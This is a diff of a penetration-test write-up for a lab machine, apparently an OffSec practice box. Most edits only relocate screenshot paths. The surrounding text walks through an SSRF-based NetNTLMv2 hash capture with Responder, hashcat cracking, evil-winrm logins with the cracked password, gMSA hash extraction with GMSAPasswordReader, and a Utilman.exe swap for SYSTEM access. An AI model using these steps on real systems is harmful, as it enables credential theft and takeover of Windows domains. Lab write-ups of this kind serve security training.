@@ -22,7 +22,7 @@ IP: 192.168.231.165
 - Utilized GMSAPasswordReader.exe to read svc_apache's NTML hash
 - Utilized user svc_apache and NTLM has to login to an evil-winrm session
 - Found SeRestorePrivilege is enabled and followed privilege escalation steps 
-- 
+- Then received a cmd session as NT authority/system
 
 ## Improved skills
 - Active Directory enumeration
@@ -352,30 +352,30 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated to "http://192.168.231.165:8080/" and found the following webpage:
 
-![](Pasted%20image%2020221012174609.png)
+![](Images/Pasted%20image%2020221012174609.png)
 
 
 #### -Typed "updog -p 445" on kali machine to fire up an HTTP Server
 
 #### - Typed "http://[Kali IP]:445" into the "Enter URL" bar and clicked the search icon
 
-![](Pasted%20image%2020221012174728.png)
+![](Images/Pasted%20image%2020221012174728.png)
 
 #### - I was able to access my server. This confirmed that this server is vulnerable to SSRF
 
-![](Pasted%20image%2020221012174847.png)
-![](Pasted%20image%2020221012180025.png)
+![](Images/Pasted%20image%2020221012174847.png)
+![](Images/Pasted%20image%2020221012180025.png)
 #SSRFvulnerability
 
 #### - Clicking on any of my files makes the URL try to navigate to it as a sub directory off of the main page; for example clicking on utils.py file brings us to "http://192.168.231.165:8080/utils.py" which obviously doesn't exist:
 
-![](Pasted%20image%2020221012181158.png)
+![](Images/Pasted%20image%2020221012181158.png)
 
 #### - However, by adding the filename in the initial search it reads the file I select but does not execute it.
 
-![](Pasted%20image%2020221012181305.png)
+![](Images/Pasted%20image%2020221012181305.png)
 
-![](Pasted%20image%2020221012181352.png)
+![](Images/Pasted%20image%2020221012181352.png)
 
 #### - It appears we will not be able to get command execution by accessing files on our web server directly; however, the second part of the description on SSRF attacks above seems interesting: In some cases, an SSRF vulnerability may allow an attacker to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials. 
 
@@ -396,11 +396,11 @@ responder -I tun0 -wv
 
 #### - Next, we need to send a request to our IP on a port that is not open and we should get a hash in our Responder window. For this example, I just forwarded the request to my IP without specifying a port since my web server is on port 445 and this request will target port 80, which is not open.
 
-![](Pasted%20image%2020221012181516.png)
+![](Images/Pasted%20image%2020221012181516.png)
 
 #### - After sending the request we receive a NetNTLMv2 hash for the user **enox** comes in to our Responder output.
 
-![](Pasted%20image%2020221012181626.png)
+![](Images/Pasted%20image%2020221012181626.png)
 
 #### - Copy the entire hash including the username and use a text editor to paste it into a file named hash.txt. After that, use the following commands to find the cracking mode needed for this hash type and then to begin cracking it:
 
@@ -415,12 +415,12 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 #### - Typed crackmapexec winrm 192.168.123.165 -d heist.offsec -u enox -p california -x "whoami" and found user "heist/enox" is running on the target machine:
 
 
-![](Pasted%20image%2020221012181836.png)
+![](Images/Pasted%20image%2020221012181836.png)
 
 
 #### - Typed "evil-winrm -i 192.168.123.165 -u enox -p california" and received the below winrm shell:
 
-![](Pasted%20image%2020221012212318.png)
+![](Images/Pasted%20image%2020221012212318.png)
 #evil-winrm  #Winrmshell
 
 
@@ -431,7 +431,7 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 
 #### - Typed "net user enox" and noted current user "enox" is a part of "Web Admins" group memberships
 
-![](Pasted%20image%2020221012182010.png)
+![](Images/Pasted%20image%2020221012182010.png)
 #Windowsuserenumeration
 
 #### - Attempted to enumerate Privelege Escalation vectors by utilizing PowerUp.ps1 and other privilege escalation scripts but found nothing
@@ -444,18 +444,18 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 
 #### - Navigated back to another terminal session on my kali machine and typed "bloodhound-python -u enox -p california -ns 192.168.81.165 -d heist.offsec -c all" and retreived the following computers, domains, groups and users information in .json format from the target machine in order to upload the information to bloodhound:
 
-![](Pasted%20image%2020221012213928.png)
-![](Pasted%20image%2020221012214003.png)
+![](Images/Pasted%20image%2020221012213928.png)
+![](Images/Pasted%20image%2020221012214003.png)
 
 #### - Navigated to bloodhound and clicked "upload data". Then highlighted all the .json files and clicked open.  The target machines actived directory information was uploaded to bloodhound.
 
 #### - Clicked the hamburger icon in the upper left hand corner of bloodhound and then clicked the "Analysis"tab to see a list of pre-built queries.
 
-![](Pasted%20image%2020221012214126.png)
+![](Images/Pasted%20image%2020221012214126.png)
 
 #### - Going from the bottom up on this list, nothing was providing data until I got to **Shortest Paths to High Value Targets**, which revealed nothing interesting about my current user; however, it did show some interesting info on the service account.
 
-![](Pasted%20image%2020221012214301.png)
+![](Images/Pasted%20image%2020221012214301.png)
 #ADservicecanreadGMSApassword #GMSA #GroupManagedServiceAccount
 
 #### - This shows that the **svc_apache** service account can read the GMSA password, which means that the **svc_apache** account is a Group Managed Service Account (gMSA).
@@ -465,7 +465,7 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
 
 Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
 
-![](Pasted%20image%2020221012214423.png)
+![](Images/Pasted%20image%2020221012214423.png)
 
 #### - This shows that members of Web Admins group can retrieve the gMSA password. Earlier during the manual enumeration, we saw that our current user **enox** was a member of this group! This also shows that the svc_apache account is in the remote users group, which means that once we extract the gMSA password, we can remote in with this account using evil-winrm.
 
@@ -473,22 +473,22 @@ Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupMan
 
 Get-ADGroupMember 'Web Admins'
 
-![](Pasted%20image%2020221012214545.png)
+![](Images/Pasted%20image%2020221012214545.png)
 
 
 ## Lateral Movement vector
 
 #### - Googled "gMSA password extraction tool github" and found the following tool to extract the NT hash from the active directory:
 
-![](Pasted%20image%2020221012215446.png)
+![](Images/Pasted%20image%2020221012215446.png)
 
-![](Pasted%20image%2020221012215548.png)
+![](Images/Pasted%20image%2020221012215548.png)
 
 #### - Downloaded the GMSAPasswordReader.exe precompiled binary to target machine
 
 #### - Typed .\GMSAPasswordReader.exe --AccountName 'svc_apache' and retreived the following  NTLM hash:
 
-![](Pasted%20image%2020221012215649.png)
+![](Images/Pasted%20image%2020221012215649.png)
 #GMSApasswordReader.exe
 #### - The rc4_hmac hash is the same as the NT hash, they are interchangeable.
 #rc4_hmac
@@ -500,23 +500,23 @@ Get-ADGroupMember 'Web Admins'
 ## Local Enumeration
 #### - Typed whoami /priv and found SeRestorePrivilege is enabled:
 
-![](Pasted%20image%2020221012220215.png)
+![](Images/Pasted%20image%2020221012220215.png)
 #SeRestorePrivilegeEnabledPrivelegeEscalation
 
 #### - Googled "SeRestorePrivilege privilege escalation" and found the following Hacktricks page showing the steps to escalate privileges:
 
-![](Pasted%20image%2020221012220333.png)
+![](Images/Pasted%20image%2020221012220333.png)
 
 
 ## Privilege Escalation vector
 ## SeRestorePrivilege privilege escalation
 
 #### - Navigated to "C:\Windows\system32" and located Utilman.exe:
-![](Pasted%20image%2020221012220556.png)
+![](Images/Pasted%20image%2020221012220556.png)
 
 #### - Typed "ren Utilman.exe Utilman.old" and confirmed the filename changed:
 
-![](Pasted%20image%2020221012220652.png)
+![](Images/Pasted%20image%2020221012220652.png)
 
 #### - Typed "ren cmd.exe Utilman.exe"
 
@@ -526,8 +526,8 @@ Get-ADGroupMember 'Web Admins'
 
 #### - Once at login page of RDP session I typed "windows key + u key" and received a cmd session as NT authority/system:
 
-![](Pasted%20image%2020221012220806.png)
+![](Images/Pasted%20image%2020221012220806.png)
 
-![](Pasted%20image%2020221012220843.png)
+![](Images/Pasted%20image%2020221012220843.png)
 
 ---
